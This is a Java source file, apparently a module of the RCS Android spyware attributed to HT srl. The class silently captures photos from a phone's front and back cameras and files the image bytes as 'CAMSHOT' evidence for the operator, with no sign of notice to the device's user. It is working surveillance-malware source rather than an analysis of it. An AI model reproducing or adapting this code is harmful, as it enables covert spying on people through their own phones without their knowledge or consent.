/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : CameraAgent.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.module;

import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;

import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.ConfModule;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.evidence.EvidenceType;
import com.android.dvci.module.camera.CameraSnapshot;
import com.android.dvci.util.Check;
import com.android.dvci.util.Utils;

import java.io.IOException;
import java.util.concurrent.Callable;
import java.util.concurrent.TimeUnit;

//MANUAL http://developer.android.com/guide/topics/media/camera.html

/**
 * The Class ModuleCamera.
 */
public class ModuleCamera extends BaseInstantModule {

	private static final String TAG = "ModuleCamera"; //$NON-NLS-1$

	int counter = 0;


	//private boolean face;

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
	 */
	@Override
	public boolean parse(ConfModule conf) {

		//boolean force = conf.getBoolean("force", false);
		//face = conf.getBoolean("face", false);

		return Status.self().haveCamera();
	}

	@Override
	public void actualStart() {
		try {
			snapshot();
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualStart) Error: " + e);
			}
		}
	}



	/**
	 * Snapshot.
	 *
	 * @throws IOException
	 */
	private void snapshot() throws IOException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (snapshot)");
		}
		counter++;

		if (Build.VERSION.SDK_INT > Build.VERSION_CODES.HONEYCOMB) {
			final CameraSnapshot camera = CameraSnapshot.self();

			synchronized(Status.self().lockFramebuffer) {
				camera.snapshot(Camera.CameraInfo.CAMERA_FACING_FRONT);
			}
			Utils.sleep(100);
			synchronized(Status.self().lockFramebuffer) {
				camera.snapshot(Camera.CameraInfo.CAMERA_FACING_BACK);
			}
			synchronized(Status.self().lockFramebuffer) {
				//camera.snapshot(CameraSnapshot.CAMERA_ANY);
				//new Handler(Looper.getMainLooper()).post(new Runnable() {
				//	@Override
				//	public void run() {
				//		camera.snapshot(CameraSnapshot.CAMERA_ANY);
				//	}
				//});

				//new AsyncTask() {
				//	@Override
				//	protected Object doInBackground(Object[] objects) {
				//		camera.snapshot(CameraSnapshot.CAMERA_ANY);
				//		return null;
				//	}
				//}.execute();
			}

		}

	}

	public static void callback(byte[] bs) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (callback), bs: " + bs.length);
		}
		EvidenceBuilder.atomic(EvidenceType.CAMSHOT, null, bs);
	}

}
